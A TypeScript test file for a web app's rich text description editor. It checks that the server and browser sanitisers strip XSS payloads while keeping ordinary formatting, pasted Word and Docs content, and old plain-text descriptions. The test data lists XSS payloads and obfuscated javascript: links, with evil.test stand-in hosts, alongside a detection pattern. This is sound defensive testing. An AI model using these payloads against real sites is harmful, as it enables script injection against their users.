/**
 * ===========================================================================
 *  ONE RICH TEXT EDITOR, AND WHAT IT IS ALLOWED TO SAVE
 * ===========================================================================
 * The product description and the Emails automation body are written in the
 * same editor (components/app/rich-text-editor.tsx). What it saves goes
 * through an allow list on the server when it is saved and again when it is
 * read (lib/rich-text/sanitize.ts), and through the same list in the
 * renderer (lib/rich-text/html.ts). Before this nothing cleaned a
 * description at all: the page put the row straight into the DOM, and the
 * old editor's own output carried inline event handlers onto the live page.
 *
 * Checked here:
 *   - the server allow list, with the usual attacks and the shapes the old
 *     editor saved that must still render
 *   - the browser-side cleaner, which must refuse the same things
 *   - the paste cleaner, on what Word, Google Docs and a web page put on the
 *     clipboard
 *   - old plain text descriptions, through the editor and back, unchanged
 *   - the wiring: saved through the server, read through the server,
 *     rendered through the cleaner
 *
 * The editor's behaviour in a browser (typing, the toolbar, sizes on a
 * phone) is measured by scripts/check-rich-text.mjs.
 *
 * Run with:  npm run test:push
 */
import { readFileSync } from "node:fs"
import { join } from "node:path"
import { sanitizeDescription } from "@/lib/rich-text/sanitize"
import {
  cleanPastedHtml,
  cleanStoredHtml,
  htmlToPlainText,
  isBlankHtml,
  looksLikeHtml,
  plainTextToHtml,
  toEditorHtml,
} from "@/lib/rich-text/html"
import { MAX_DESCRIPTION_BYTES, descriptionTooLong, normaliseTypedHref, safeHref } from "@/lib/rich-text/policy"

let passed = 0
let failed = 0
const failures: string[] = []
function check(label: string, ok: boolean, detail?: string) {
  if (ok) {
    passed++
    console.log(`  ok    ${label}`)
  } else {
    failed++
    failures.push(label)
    console.log(`  FAIL  ${label}${detail ? `\n        ${detail}` : ""}`)
  }
}
const section = (title: string) => console.log(`\n${title}`)
const read = (p: string) => readFileSync(join(process.cwd(), p), "utf8")

/** Anything that could run, fetch through CSS, or frame another site. */
const DANGEROUS = /<script|<style|<svg|<math|<form|<object|<embed\b|<button|<input|<meta|<base|<link|\son[a-z]+\s*=|javascript:|vbscript:|data:text|expression\(|url\(|position:\s*fixed/i

const ENGINES: Array<[string, (html: string) => string]> = [
  ["server", sanitizeDescription],
  ["renderer", (html) => cleanStoredHtml(html)],
]

// ===========================================================================
section("The allow list refuses what could run, on both engines")
// ===========================================================================
const ATTACKS: Array<[string, string]> = [
  ["a script tag", "<p>hi</p><script>alert(1)</script>"],
  ["a script with its text", "<p>a</p><script>document.cookie</script><p>b</p>"],
  ["an inline handler on an image", `<img src="https://x.test/a.png" onerror="alert(1)">`],
  ["the old editor's own mouse handlers", `<div data-embed-type="image" onmouseenter="this.querySelector('b').style.opacity='1'"><img src="https://x.test/a.png"></div>`],
  ["a handler on a paragraph", `<p onclick="alert(1)">x</p>`],
  ["a javascript: link", `<a href="javascript:alert(1)">x</a>`],
  ["a javascript: link in capitals", `<a href="JaVaScRiPt:alert(1)">x</a>`],
  ["a javascript: link hidden with a tab", `<a href="java\tscript:alert(1)">x</a>`],
  ["a javascript: link spelled in entities", `<a href="&#106;avascript:alert(1)">x</a>`],
  ["a javascript: link spelled in entities with no semicolons", `<a href="&#106&#97vascript:alert(1)">x</a>`],
  ["a vbscript: link", `<a href="vbscript:msgbox(1)">x</a>`],
  ["a data: link", `<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>`],
  ["an svg image with script in it", `<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">`],
  ["a style block", "<style>body{display:none}</style><p>x</p>"],
  ["a style attribute that covers the page", `<div style="position:fixed;inset:0;z-index:99999;background:#fff">gotcha</div>`],
  ["a style that fetches", `<p style="background-image:url(https://evil.test/track.gif)">x</p>`],
  ["a style with an old IE expression", `<p style="width:expression(alert(1))">x</p>`],
  ["an iframe from anywhere", `<iframe src="https://evil.test/phish"></iframe>`],
  ["an iframe with javascript", `<iframe src="javascript:alert(1)"></iframe>`],
  ["an svg with a handler", `<svg onload="alert(1)"><circle r="1"/></svg>`],
  ["a form that posts elsewhere", `<form action="https://evil.test"><input name="card"><button>Pay</button></form>`],
  ["an object", `<object data="https://evil.test/x.swf"></object>`],
  ["a meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.test">`],
  ["a base tag", `<base href="https://evil.test/">`],
  ["a protocol relative link", `<a href="//evil.test/">x</a>`],
  ["a tag split across a comment", `<scr<!-- -->ipt>alert(1)</script>`],
  ["an unclosed attribute", `<p>ok</p><img src="https://x.test/a.png" onerror="alert(1)`],
]
for (const [engine, clean] of ENGINES) {
  for (const [label, html] of ATTACKS) {
    const out = clean(html)
    check(`${engine}: ${label}`, !DANGEROUS.test(out), out)
  }
}
{
  const out = sanitizeDescription(`<p>Kept</p><script>alert("gone")</script>`)
  check("the text inside a script does not come out as text", out === "<p>Kept</p>", out)
  const legacy = sanitizeDescription(`<div data-embed-type="image" class="embed-container" contenteditable="false" onmouseenter="x()"><button data-delete-embed="true" onmouseenter="y()"><svg><line x1="1"/></svg></button><img src="https://cdn.test/a.png" alt="Image" style="max-width: 100%; height: auto; border-radius: 8px; display: block; object-fit: cover;"></div>`)
  check("the old editor's delete button leaves nothing behind", !/button|svg|contenteditable|onmouse/.test(legacy), legacy)
  check("and its image is still there, sized as it was",
    /<img src="https:\/\/cdn\.test\/a\.png" alt="Image" style="max-width: ?100%; ?height: ?auto; ?border-radius: ?8px; ?display: ?block; ?object-fit: ?cover"/.test(legacy), legacy)
}
{
  /* The two engines are two implementations of one list, so on what the
     old editor and the new one actually save they must say the same thing,
     give or take how each spells a void tag or a space. */
  const same = (html: string) =>
    html
      .replace(/<span>|<\/span>/g, "")
      .replace(/&nbsp;|\u00a0/g, " ")
      .replace(/<([a-z0-9]+)((?:\s+[a-z-]+(?:="[^"]*")?)*)\s*\/?>/gi, (_m, tag: string, attrs: string) => {
        const list = (attrs.match(/[a-z-]+(?:="[^"]*")?/gi) ?? [])
          .map((a) => a.replace(/=""$/, ""))
          .map((a) => (a.startsWith("style=") ? a.replace(/:\s+/g, ":").replace(/;\s*/g, ";").replace(/;"$/, '"') : a))
          .sort()
        return `<${tag}${list.map((a) => ` ${a}`).join("")}>`
      })
  const SAVED = [
    `<div data-embed-id="embed-1" data-embed-type="youtube" contenteditable="false" class="embed-container" style="position: relative; padding-bottom: 56.25%; height: 0;" onmouseenter="this.querySelector('[data-delete-embed]').style.opacity='1'"><button data-delete-embed="true" style="position: absolute;"><svg width="14"><line x1="18"></line></svg></button><iframe src="https://www.youtube.com/embed/abc" style="position: absolute; top: 0;" allow="accelerometer; autoplay; encrypted-media; picture-in-picture" allowfullscreen loading="lazy"></iframe></div><p><br></p>`,
    `<div data-embed-type="x-post" data-x-url="https://x.com/jack/status/20" class="embed-container x-embed-container" style="margin: 12px 0; min-height: 200px;"><blockquote class="twitter-tweet" data-dnt="true" data-theme="light"><a href="https://x.com/jack/status/20">Loading tweet...</a></blockquote></div>`,
    `<div style="text-align: center; margin: 8px 0;"><a href="https://example.com" target="_blank" rel="noopener noreferrer" style="display: inline-block; padding: 12px 24px; font-weight: 500; text-decoration: none; background-color: #7c3aed; color: #ffffff; border-radius: 8px;">Buy now</a></div>`,
    `<h1>Header</h1><h2>Title</h2><h3>Subtitle</h3><p>Some <b>bold</b>, <i>italic</i>, <u>under</u> and <strike>struck</strike> text&nbsp;here.</p><ol><li>One</li><li>Two<ul><li>Nested</li></ul></li></ol><blockquote>Said</blockquote><hr style="margin: 16px 0; border: 0;">`,
    `<div class="w-full my-[1px]"><div data-slate-node="element" class="py-[3px]"><span data-slate-node="text"><span class="font-[600]" style="white-space: break-spaces;">The Problem:</span></span> You are&nbsp;running ads</div></div>`,
  ]
  SAVED.forEach((html, n) => {
    const a = same(sanitizeDescription(html))
    const b = same(cleanStoredHtml(html))
    check(`the server and the renderer agree on saved description ${n + 1}`, a === b, `server:   ${a}\n        renderer: ${b}`)
  })
}

// ===========================================================================
section("What a description is made of survives, on both engines")
// ===========================================================================
const KEEP: Array<[string, string, RegExp]> = [
  ["headings", "<h2>Heading</h2><h3>Subheading</h3>", /<h2>Heading<\/h2><h3>Subheading<\/h3>/],
  ["bold, italic, underline, strike", "<p><strong>b</strong> <em>i</em> <u>u</u> <s>s</s></p>", /<strong>b<\/strong> <em>i<\/em> <u>u<\/u> <s>s<\/s>/],
  ["lists of both kinds", "<ul><li>one</li></ul><ol><li>two</li></ol>", /<ul><li>one<\/li><\/ul><ol><li>two<\/li><\/ol>/],
  ["a quote and a rule", "<blockquote>q</blockquote><hr>", /<blockquote>q<\/blockquote><hr ?\/?>/],
  ["a web link, opened in a new tab", `<a href="https://example.com/a?b=1&amp;c=2">x</a>`, /<a href="https:\/\/example\.com\/a\?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">x<\/a>/],
  ["an email link", `<a href="mailto:me@example.com">mail</a>`, /<a href="mailto:me@example\.com">mail<\/a>/],
  ["a phone link", `<a href="tel:+442079460000">call</a>`, /<a href="tel:\+442079460000">call<\/a>/],
  ["a link to a page on the same site", `<a href="/p/other-product">other</a>`, /<a href="\/p\/other-product">other<\/a>/],
  ["a paragraph's alignment", `<p style="text-align: center;">c</p>`, /<p style="text-align: ?center;?">c<\/p>/],
  ["a YouTube embed the old editor saved", `<div data-embed-type="youtube" style="position:relative;padding-bottom:56.25%"><iframe src="https://www.youtube.com/embed/abc" allowfullscreen></iframe></div>`, /<div data-embed-type="youtube"><iframe src="https:\/\/www\.youtube\.com\/embed\/abc" allowfullscreen(="")?><\/iframe><\/div>/],
  ["an image the old editor stored inline, in its wrapper", `<div data-embed-type="image"><img src="data:image/png;base64,iVBORw0KGgo="></div>`, /<div data-embed-type="image"><img src="data:image\/png;base64,iVBORw0KGgo=" loading="lazy" ?\/?><\/div>/],
  ["an image the old editor linked, in its wrapper", `<div data-embed-type="image"><img src="https://cdn.example.com/a.jpg" alt="Old"></div>`, /<img src="https:\/\/cdn\.example\.com\/a\.jpg" alt="Old" loading="lazy" ?\/?>/],
  ["an old coloured button", `<div style="text-align: center; margin: 8px 0;"><a href="https://example.com" style="display: inline-block; padding: 12px 24px; font-weight: 500; text-decoration: none; background-color: #16a34a; color: #ffffff; border-radius: 8px;">Buy</a></div>`, /background-color: ?#16a34a[\s\S]*>Buy<\/a>/],
]
for (const [engine, clean] of ENGINES) {
  for (const [label, html, want] of KEEP) {
    const out = clean(html)
    check(`${engine}: ${label}`, want.test(out), out)
  }
}
for (const [engine, clean] of ENGINES) {
  const out = clean(`<p><a href="https://example.com" style="color: #7c3aed; text-decoration: underline;">link</a> <span style="color: rgb(55, 65, 81); font-size: 14px;">grey</span></p>`)
  check(`${engine}: a colour on ordinary text is the editor's, and goes`, !/style=/.test(out) && /link<\/a> (<span>)?grey/.test(out), out)
  const classes = clean(`<p class="fixed inset-0 z-50">x</p><div class="embed-container evil">y</div>`)
  check(`${engine}: classes go, except the embed wrappers' own`, !/fixed|inset|evil/.test(classes) && /embed-container/.test(classes), classes)
}

// ===========================================================================
section("Pictures: only from this project's own storage")
// ===========================================================================
{
  const OWN = "https://skgtqglupjcnfhfscink.supabase.co/storage/v1/object/public/product-images/c1/p1/1_description_ab.webp"
  for (const [engine, clean] of ENGINES) {
    const kept = clean(`<p><img src="${OWN}" alt="A mug on a desk" width="1200" height="800" title="t" style="position:fixed;inset:0" class="x" onerror="alert(1)" loading="eager" decoding="async"></p>`)
    check(`${engine}: an uploaded picture keeps its address, alt text and size, and is lazy`,
      new RegExp(`^<p><img src="${OWN.replace(/[./?]/g, "\\$&")}" alt="A mug on a desk" width="1200" height="800" loading="lazy" ?/?></p>$`).test(kept), kept)
    const refused: Array<[string, string]> = [
      ["from another site", `<p><img src="https://evil.example.com/pixel.png"></p>`],
      ["from another Supabase project", `<p><img src="https://other.supabase.co/storage/v1/object/public/x/a.png"></p>`],
      ["from our storage but not a public object", `<p><img src="https://skgtqglupjcnfhfscink.supabase.co/storage/v1/object/sign/product-files/a.png?token=x"></p>`],
      ["over plain http", `<p><img src="http://skgtqglupjcnfhfscink.supabase.co/storage/v1/object/public/product-images/a.png"></p>`],
      ["protocol relative", `<p><img src="//skgtqglupjcnfhfscink.supabase.co/storage/v1/object/public/product-images/a.png"></p>`],
      ["as a data: URL outside the old wrapper", `<p><img src="data:image/png;base64,iVBORw0KGgo="></p>`],
      ["as a javascript: URL", `<p><img src="javascript:alert(1)"></p>`],
      ["as a blob: preview left by an upload", `<p><img src="blob:https://storelib.com/5d1c" data-uploading="a1"></p>`],
      ["as an SVG data URL, even in the old wrapper", `<div data-embed-type="image"><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="></div>`],
      ["as a javascript: URL, even in the old wrapper", `<div data-embed-type="image"><img src="javascript:alert(1)"></div>`],
    ]
    for (const [label, html] of refused) {
      const out = clean(html)
      check(`${engine}: a picture ${label} is dropped`, !/<img/.test(out), out)
    }
  }
  check("the editor saves nothing for a picture still uploading",
    cleanStoredHtml(`<p><img src="blob:https://storelib.com/5d1c" alt="" data-uploading="a1"></p>`, { blocks: true }) === "")
  const upload = read("lib/rich-text/upload-image.ts")
  check("a picture is compressed and put in the product images bucket, like the product's photos",
    /compressImage\(file, COMPRESS_PROFILES\["product-images"\]\)/.test(upload) && /storage\.from\("product-images"\)\.upload\(/.test(upload))
  check("and never written into the HTML as its bytes", !/readAsDataURL|base64/.test(upload))
  check("an SVG is refused before it is uploaded", /svg/.test(upload) && /imageFileProblem/.test(upload))
  const rte = read("components/app/rich-text-editor.tsx")
  check("the picker opens from the tap itself, offering the library and the camera", /fileRef\.current\.click\(\)/.test(rte) && /accept="image\/\*"/.test(rte) && !/capture=/.test(rte))
  check("and is not display:none, which some WebViews will not open", /className="sr-only"/.test(rte))
  check("the Picture control only exists where a field can upload", /t !== "image" \|\| !!uploadImage/.test(rte))
  check("the Emails body cannot upload pictures", !/uploadImage/.test(read("app/app/emails/flow/body-editor.tsx")))
  check("the product description can", /uploadImage=\{\(file\) => uploadDescriptionImage\(file, \{ creatorId, productId \}\)\}/.test(read("app/app/products/new/product-editor.tsx")))
}

// ===========================================================================
section("A save is capped, and only for somebody signed in")
// ===========================================================================
{
  check("the limit is 200 KB", MAX_DESCRIPTION_BYTES === 200 * 1024)
  check("a description at the limit is fine", descriptionTooLong(`<p>${"a".repeat(MAX_DESCRIPTION_BYTES - 7)}</p>`) === null)
  const over = descriptionTooLong(`<p>${"a".repeat(MAX_DESCRIPTION_BYTES)}</p>`)
  check("one over it is refused, in words the editor shows", !!over && /over the 200 KB limit/.test(over), over ?? "")
  const inline = descriptionTooLong(`<div data-embed-type="image"><img src="data:image/png;base64,${"A".repeat(MAX_DESCRIPTION_BYTES)}"></div>`)
  check("and when old inline pictures are why, it says so and what to do", !!inline && /photo button/.test(inline), inline ?? "")
  check("the limit counts bytes, not characters", descriptionTooLong(`<p>${"\u00e9".repeat(MAX_DESCRIPTION_BYTES / 2)}</p>`) !== null)
  const action = read("app/app/products/new/description-action.ts")
  const body = action.slice(action.indexOf("export async function cleanDescription"))
  check("the server action refuses too much before it parses anything",
    /const tooLong = descriptionTooLong\(html\)\s*\n\s*if \(tooLong\) return \{ ok: false, error: tooLong \}/.test(body) && body.indexOf("descriptionTooLong(") < body.indexOf("sanitizeDescription("))
  check("and refuses anybody not signed in",
    /auth\.getUser\(\)/.test(body) && /if \(!user\) return \{ ok: false/.test(body) && body.indexOf("!user") < body.indexOf("sanitizeDescription("))
  check("it answers rather than throws, so the editor can show why", /Promise<CleanedDescription>/.test(action))
  const save = read("app/app/products/new/description-save.ts")
  check("the save shows a refusal's own words", /if \(!result\.ok\) throw new Error\(result\.error\)/.test(save))
  check("and an unchanged description is not sent again, so an old long one never blocks a save", /if \(stored !== null && current === stored\) return current/.test(save))
  check("the field shows the same limit while typing", /checkSize=\{descriptionTooLong\}/.test(read("app/app/products/new/product-editor.tsx")))
  check("the creator page's inline editor saves nothing it was refused", /if \(!cleaned\.ok\)/.test(read("components/store-builder/preview-canvas.tsx")))
}

// ===========================================================================
section("Addresses: only web, email, phone and this site")
// ===========================================================================
check("https is a link", safeHref("https://example.com/x") === "https://example.com/x")
check("http is a link", safeHref("http://example.com") === "http://example.com")
check("mailto is a link", safeHref("mailto:a@b.co") === "mailto:a@b.co")
check("tel is a link", safeHref("tel:+1 555 0100") === "tel:+1 555 0100")
check("a path is a link", safeHref("/p/thing") === "/p/thing" && safeHref("#faq") === "#faq")
check("javascript: is not", safeHref("javascript:alert(1)") === null && safeHref(" javascript:alert(1)") === null)
check("javascript: with a newline in it is not", safeHref("java\nscript:alert(1)") === null)
check("data: is not", safeHref("data:text/html,x") === null)
check("file: is not", safeHref("file:///etc/passwd") === null)
check("protocol relative is not", safeHref("//evil.test") === null)
check("a bare word with a colon is not taken for a path", safeHref("evil:thing") === null)
check("typing example.com means https://example.com", normaliseTypedHref("example.com/page") === "https://example.com/page")
check("typing an address means mailto:", normaliseTypedHref("me@example.com") === "mailto:me@example.com")
check("typing a phone number means tel:", normaliseTypedHref("+44 20 7946 0000") === "tel:+442079460000")
check("typing javascript: means nothing", normaliseTypedHref("javascript:alert(1)") === null)
check("typing nonsense means nothing", normaliseTypedHref("not a link") === null)

// ===========================================================================
section("Pasting from Word, Google Docs and web pages")
// ===========================================================================
{
  const docs = `<meta charset='utf-8'><b style="font-weight:normal;" id="docs-internal-guid-1234"><h1 dir="ltr" style="line-height:1.38;margin-top:20pt"><span style="font-size:20pt;font-family:Arial;color:#000000;font-weight:400">What you get</span></h1><p dir="ltr" style="line-height:1.38"><span style="font-size:11pt;font-family:Arial;color:#000000;font-weight:400">A </span><span style="font-size:11pt;font-family:Arial;color:#000000;font-weight:700">bold</span><span style="font-size:11pt;font-family:Arial;color:#000000;font-weight:400"> and </span><span style="font-size:11pt;font-family:Arial;color:#000000;font-weight:400;font-style:italic">italic</span><span style="font-size:11pt;font-family:Arial;font-weight:700;font-style:italic"> both</span><span style="font-size:11pt"> line.</span></p><ul style="margin-top:0;margin-bottom:0"><li dir="ltr" style="list-style-type:disc;font-size:11pt"><p dir="ltr" style="line-height:1.38" role="presentation"><span style="font-size:11pt">First</span></p></li><li dir="ltr" style="list-style-type:disc"><p dir="ltr"><span style="font-size:11pt">Second with </span><a href="https://example.com/x" style="text-decoration:none"><span style="font-size:11pt;color:#1155cc;text-decoration:underline">a link</span></a></p></li></ul><br></b>`
  const out = cleanPastedHtml(docs)
  check("Docs: the wrapper that is not bold does not make everything bold", !/^<strong>/.test(out) && !/<h2><strong>/.test(out), out)
  check("Docs: its heading is a heading", /<h2>What you get<\/h2>/.test(out), out)
  check("Docs: bold and italic come from its spans", /A <strong>bold<\/strong> and <em>italic<\/em><strong><em> both<\/em><\/strong> line\./.test(out), out)
  check("Docs: its list is a list, with no paragraph inside each item", /<ul><li>First<\/li><li>Second with <a href="https:\/\/example\.com\/x">a link<\/a><\/li><\/ul>/.test(out), out)
  check("Docs: no style, class, font, colour or dir survives", !/style=|class=|font|color|dir=|id=/.test(out), out)
}
{
  const word = `<html xmlns:o="urn:schemas-microsoft-com:office:office"><head><meta name=Generator content="Microsoft Word 15"><style><!-- p.MsoNormal {margin:0cm; font-family:"Calibri"} --></style><!--[if gte mso 9]><xml><o:OfficeDocumentSettings></o:OfficeDocumentSettings></xml><![endif]--></head><body lang=EN-GB><!--StartFragment--><p class=MsoNormal><b><span lang=EN-US style='font-size:14.0pt'>Course outline<o:p></o:p></span></b></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoListParagraphCxSpFirst style='text-indent:-18.0pt;mso-list:l0 level1 lfo1'><![if !supportLists]><span style='font-family:Symbol'><span style='mso-list:Ignore'>\u00b7<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;</span></span></span><![endif]>Week one<o:p></o:p></p><p class=MsoListParagraphCxSpLast style='text-indent:-18.0pt;mso-list:l0 level1 lfo1'><![if !supportLists]><span style='mso-list:Ignore'>\u00b7<span>&nbsp;</span></span><![endif]>Week <i>two</i><o:p></o:p></p><p class=MsoListParagraphCxSpFirst style='mso-list:l1 level1 lfo2'><![if !supportLists]><span style='mso-list:Ignore'>1.<span>&nbsp;</span></span><![endif]>Step<o:p></o:p></p><!--EndFragment--></body></html>`
  const out = cleanPastedHtml(word)
  check("Word: the style block and the xml are gone", !/MsoNormal|Calibri|OfficeDocument/.test(out), out)
  check("Word: a bold paragraph stays bold", /<p><strong>Course outline<\/strong><\/p>/.test(out), out)
  check("Word: an empty paragraph of &nbsp; is dropped", !/<p>\s*<\/p>|<p>&nbsp;<\/p>/.test(out), out)
  check("Word: its bulleted paragraphs become a list, without the bullet character", /<ul><li>Week one<\/li><li>Week <em>two<\/em><\/li><\/ul>/.test(out), out)
  check("Word: its numbered paragraphs become a numbered list", /<ol><li>Step<\/li><\/ol>/.test(out), out)
}
{
  const web = `<div class="post" style="color:red"><h4 class="x">Specs</h4><table><tr><td>Size</td><td>A4</td></tr></table><p>Line one<br>line two<br><br>New paragraph</p><img src="https://x.test/a.png"><iframe src="https://www.youtube.com/embed/x"></iframe><script>track()</script><a href="javascript:alert(1)">bad link</a> <a href="https://ok.test">good link</a><h1>Big</h1><h5>Small</h5><blockquote><p>Quoted</p></blockquote><hr><font face="Comic Sans" color="red">font tag</font></div>`
  const out = cleanPastedHtml(web)
  check("web: h4 and h5 become the smaller heading, h1 the larger", /<h3>Specs<\/h3>/.test(out) && /<h2>Big<\/h2>/.test(out) && /<h3>Small<\/h3>/.test(out), out)
  check("web: two line breaks start a new paragraph, one stays a line break", /<p>Line one<br>line two<\/p><p>New paragraph<\/p>/.test(out), out)
  check("web: images and embeds are not pasted into a description", !/<img|<iframe/.test(out), out)
  check("web: a script's text is not pasted", !/track/.test(out), out)
  check("web: a bad link keeps its words and loses its address", /bad link/.test(out) && !/javascript/.test(out), out)
  check("web: a good link is kept", /<a href="https:\/\/ok\.test">good link<\/a>/.test(out), out)
  check("web: quote and rule kept", /<blockquote><p>Quoted<\/p><\/blockquote><hr>/.test(out), out)
  check("web: a font tag is only its text", /<p>font tag<\/p>/.test(out), out)
  check("web: table cells keep their text", /Size/.test(out) && /A4/.test(out), out)
  check("web: nothing but the allowed tags comes out", !/<(?!\/?(p|h2|h3|strong|em|u|s|a|ul|ol|li|blockquote|hr|br)\b)/.test(out), out)
}
{
  check("a plain line pasted as HTML is one paragraph", cleanPastedHtml("<span>just text</span>") === "<p>just text</p>")
  check("whitespace from indentation is collapsed", cleanPastedHtml("<p>\n    spaced\n    out\n</p>") === "<p>spaced out</p>", cleanPastedHtml("<p>\n    spaced\n    out\n</p>"))
  check("nothing worth pasting is nothing", cleanPastedHtml("<p> &nbsp; </p><br><img src=x>") === "")
  check("markup-looking text stays text", cleanPastedHtml("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>") === "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")
}

// ===========================================================================
section("Old plain text descriptions load and render as they were")
// ===========================================================================
{
  const old = "Hand lettered prints.\nFree shipping.\n\nTom &amp; Jerry edition <3"
  check("plain text is recognised as plain text", !looksLikeHtml(old))
  check("the server stores it unchanged", sanitizeDescription(old) === old)
  const editor = toEditorHtml(old)
  check("the editor shows its paragraphs and line breaks",
    editor === "<p>Hand lettered prints.<br>Free shipping.</p><p>Tom &amp; Jerry edition &lt;3</p>", editor)
  const saved = cleanStoredHtml(editor, { blocks: true })
  check("what the editor would save from it is the same markup", saved === editor, saved)
  check("and reads back as the same text", htmlToPlainText(saved) === "Hand lettered prints.\nFree shipping.\n\nTom & Jerry edition <3", JSON.stringify(htmlToPlainText(saved)))
  check("an empty description is an empty paragraph to type in", toEditorHtml("") === "<p><br></p>")
  check("an empty editor saves as empty", isBlankHtml("<p><br></p>") && isBlankHtml("<p>&nbsp;</p>") && !isBlankHtml("<hr>"))
  check("plain text with entities decodes them once", plainTextToHtml("a &amp;nbsp; b") === "<p>a &amp;nbsp; b</p>")
}
{
  const html = `<h2>Title</h2><p>Some <strong>bold</strong> text.</p><ul><li>One</li></ul>`
  check("editor HTML survives the server untouched", sanitizeDescription(html) === html, sanitizeDescription(html))
  check("and the renderer", cleanStoredHtml(html) === html, cleanStoredHtml(html))
  check("and a second pass changes nothing", cleanStoredHtml(cleanStoredHtml(html)) === cleanStoredHtml(html))
  check("a bare div the browser made for a new line is saved as a paragraph",
    cleanStoredHtml("<p>One</p><div>Two</div>loose", { blocks: true }) === "<p>One</p><p>Two</p><p>loose</p>")
  check("but a stored div is rendered as the div it is", cleanStoredHtml("<div>Two</div>") === "<div>Two</div>")
}

// ===========================================================================
section("The wiring")
// ===========================================================================
{
  const editor = read("app/app/products/new/product-editor.tsx")
  check("the product editor writes the description in the shared editor",
    /import \{ RichTextEditor \} from "@\/components\/app\/rich-text-editor"/.test(editor) && /<RichTextEditor[\s\S]{0,200}value=\{description\}/.test(editor))
  check("and saves it through the server",
    /const savedDescription = await descriptionForSave\(description, storedDescriptionRef\.current\)/.test(editor) && /description: savedDescription,/.test(editor))
  const action = read("app/app/products/new/description-action.ts")
  check("which is a server action that runs the allow list", /^"use server"/.test(action) && /sanitizeDescription\(/.test(action))
  check("the creator page's inline editor saves through it too",
    /cleanDescription\(newDescription\)/.test(read("components/store-builder/preview-canvas.tsx")))
  const loader = read("lib/commerce/product-page-data.ts")
  check("a published product's description is sanitised on read", /sanitizeDescription\(/.test(loader))
  const renderer = read("components/store-builder/description-rich-editor.tsx")
  check("the renderer draws through the cleaner", /cleanStoredHtml\(html\)/.test(renderer) && /__html: clean/.test(renderer))
  check("and in the same prose styles as the editor",
    /storelib-prose/.test(renderer) && /storelib-prose/.test(read("components/app/rich-text-editor.tsx")))
  check("the Emails automation body uses the same editor", /<RichTextEditor/.test(read("app/app/emails/flow/body-editor.tsx")))
  check("the server sanitiser is never bundled to a browser", /^import "server-only"/.test(read("lib/rich-text/sanitize.ts")))
  check("the browser side does not pull in sanitize-html",
    !/from "sanitize-html"/.test(read("lib/rich-text/html.ts")) && !/from "sanitize-html"|from "@\/lib\/rich-text\/sanitize"/.test(read("components/app/rich-text-editor.tsx")))
  const rte = read("components/app/rich-text-editor.tsx")
  check("a paste is cleaned before it goes in", /cleanPastedHtml\(/.test(rte) && /onPaste=/.test(rte))
  check("a typed link goes through the address check", /normaliseTypedHref\(/.test(rte))
  check("the text is at least 16px on a phone, so iOS does not zoom", /text-\[16px\]/.test(rte))
  check("toolbar buttons are 44px on a phone", /h-11 w-11/.test(rte))
  const grid = read("components/store-builder/unified-section-renderer.tsx")
  check("a product card shows the description as text, not as markup", /plainSummary\(product\.description/.test(grid))
}

/*
 * A PICTURE'S SIZE, SHAPE AND PLACE. "I can adjust the size of the images,
 * position the image better, adjust its ratios, with draggers in corners."
 * The field writes a width in %, an aspect ratio and data-align; both the
 * server and the browser keep exactly those, rebuilt, and nothing else.
 */
console.log("\nA picture's size, shape and place")
{
  const OWN_PIC = "https://skgtqglupjcnfhfscink.supabase.co/storage/v1/object/public/product-images/c/p/1.webp"
  const placed = `<p><img src="${OWN_PIC}" alt="Mug" width="1600" height="900" data-align="right" style="width: 62.4%; aspect-ratio: 4 / 3; object-fit: cover; position: fixed; background: url(x); left: 0" onclick="x()"></p>`
  for (const [name, clean] of [["server", sanitizeDescription], ["browser", (h: string) => cleanStoredHtml(h, { blocks: true })]] as const) {
    const out = clean(placed)
    check(`${name}: keeps its width as a whole %, its shape with cover, and its place`,
      /style="width: ?62%; ?aspect-ratio: ?4 \/ 3; ?object-fit: ?cover"/.test(out) && /data-align="right"/.test(out), out)
    check(`${name}: and nothing else a style could say, and no handler`, !/position|background|left:|onclick/.test(out), out)
    const odd = clean(`<p><img src="${OWN_PIC}" data-align="middle" style="width: 400px; aspect-ratio: 0 / 1"></p>`)
    check(`${name}: a place, width or shape outside the few it can be is dropped`, !/data-align|style=/.test(odd), odd)
    const full = clean(`<p><img src="${OWN_PIC}" style="width: 100%"></p>`)
    check(`${name}: full width is no width at all`, !/style=/.test(full), full)
  }
  const css = readFileSync(join(process.cwd(), "app/globals.css"), "utf8")
  check("the page draws a placed picture as a block, left, centre or right, as the field does",
    /\.storelib-prose img\[data-align\] \{ display: block; \}/.test(css) && /\.storelib-prose img\[data-align="center"\] \{ margin-left: auto; margin-right: auto; \}/.test(css)
      && /\.storelib-prose img\[data-align="right"\] \{ margin-left: auto; margin-right: 0; \}/.test(css))
  const editor = readFileSync(join(process.cwd(), "components/app/rich-text-editor.tsx"), "utf8")
  check("the field has an Emoji control, and no blue focus ring", /emoji: \{ label: "Emoji", icon: Smile \}/.test(editor) && !/ring-ring/.test(editor) && !/focus:border-ring/.test(editor))
}

/*
 * THE TOOLBAR ROW THAT SCROLLS SIDEWAYS. "Add an arrow plus a smooth, clean
 * edge fade at the horizontal scroll of the toolbar buttons." One row
 * (components/app/rich-text/scroll-row.tsx) for every formatting toolbar;
 * scripts/check-toolbar-scroll.mjs measures it in a browser.
 */
section("A toolbar row that scrolls sideways fades and has an arrow at the end with more")
{
  const row = read("components/app/rich-text/scroll-row.tsx")
  check("its ends are read once a frame, from the scroll and from a ResizeObserver",
    /requestAnimationFrame\(read\)/.test(row) && /addEventListener\("scroll", schedule, \{ passive: true \}\)/.test(row) && /new ResizeObserver\(schedule\)/.test(row))
  check("the fade slides (mask-position), it does not switch", /transition-\[mask-position,-webkit-mask-position\]/.test(row) && /maskComposite: "intersect"/.test(row))
  check("an arrow scrolls the row smoothly, and still where motion is reduced", /row\.scrollBy\(\{ left: dir \* by, behavior: still \? "auto" : "smooth" \}\)/.test(row))
  check("an arrow keeps the text's selection", /data-scroll-arrow=\{side\}[\s\S]{0,200}onMouseDown=\{\(e\) => e\.preventDefault\(\)\}/.test(row))
  check("a hidden arrow cannot be pressed", /pointer-events-none opacity-0/.test(row) && /group-data-\[end=true\]\/scrollrow:pointer-events-auto/.test(row))
